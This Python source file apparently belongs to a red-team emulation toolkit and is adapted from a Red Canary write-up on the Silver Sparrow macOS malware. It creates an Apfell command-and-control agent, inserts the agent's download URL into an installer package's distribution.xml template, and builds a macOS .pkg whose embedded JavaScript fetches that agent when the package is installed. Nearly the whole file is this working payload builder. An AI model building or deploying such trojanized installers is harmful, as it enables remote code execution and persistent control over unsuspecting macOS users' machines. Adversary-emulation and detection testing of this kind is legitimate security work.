# Adapted from https://redcanary.com/blog/clipping-silver-sparrows-wings/

import os
import asyncio
from .Utilities import *


def install_js():
    temp = "./Templates/Installer_Package_JS/"
    payload = "./Payloads/Installer_Package_JS_Payload"

    copyanything(temp, payload)

    ## Create apfell payload
    async def scripting():
        payload_info = await login_and_create_apfell(description="Installer Pkg with JS Functionality",
                                                     filename="Installer_with_JavaScript.js",
                                                     include_all_commands=True)
        print("[*] Building Installer Package JS Payload")
        url = await get_payload_download_url(payload_info)
        templateString = "URL"
        fin = open(payload + "/distribution.xml", "rt")
        data = fin.read()
        data = data.replace(templateString, url)
        fin.close()
        fin = open(payload + "/distribution.xml", "wt")
        fin.write(data)
        fin.close()

        os.system("pkgbuild --identifier simple.test --nopayload " + payload + "/install.pkg")
        os.system(
            "productbuild --distribution " + payload + "/distribution.xml " + "--package-path " + payload + "/install.pkg " + payload + "/JSpackage.pkg")

        print("[+] Built Installer Package Payload w/ JavaScript as JSpackage.pkg")

    async def main():
        await scripting()

    asyncio.run(main())
